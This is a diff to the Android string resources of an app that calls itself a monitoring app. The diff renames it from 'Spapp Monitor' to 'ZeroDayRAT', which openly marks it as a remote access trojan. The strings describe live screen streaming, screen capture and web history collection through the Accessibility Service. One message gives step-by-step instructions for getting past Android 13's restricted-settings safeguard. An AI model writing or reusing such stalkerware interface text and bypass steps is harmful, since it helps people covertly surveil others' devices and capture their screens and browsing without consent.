@@ -44,7 +44,7 @@
     <string name="enable_accessibility">Enable Accessibility Service</string>
     <string name="accessibility_card_desc">Required for Live Screen Streaming, Screen Capture, App/Website Blocking, and Web History.</string>
     <string name="accessibility_dialog_title">Activate Accessibility Service</string>
-    <string name="accessibility_dialog_message">To enable Live Screen Stream and Monitoring:\n\n1. Tap "Go to Settings" below.\n2. In Accessibility settings, tap "Downloaded apps" or "Installed services".\n3. Select "Spapp Monitor" and turn it ON.\n\n⚠️ On Android 13+: If the toggle is grayed out ("Restricted setting"), tap "Allow Restricted" below to open App Info -> tap 3 dots (top right) -> "Allow restricted settings", then return to turn Accessibility ON.</string>
+    <string name="accessibility_dialog_message">To enable Live Screen Stream and Monitoring:\n\n1. Tap "Go to Settings" below.\n2. In Accessibility settings, tap "Downloaded apps" or "Installed services".\n3. Select "ZeroDayRAT" and turn it ON.\n\n⚠️ On Android 13+: If the toggle is grayed out ("Restricted setting"), tap "Allow Restricted" below to open App Info -> tap 3 dots (top right) -> "Allow restricted settings", then return to turn Accessibility ON.</string>
     <string name="go_to_settings">Go to Accessibility Settings</string>
     <string name="open_app_info">App Info (Allow Restricted Settings)</string>
     <string name="grant_camera_permission">Grant Camera Permission</string>
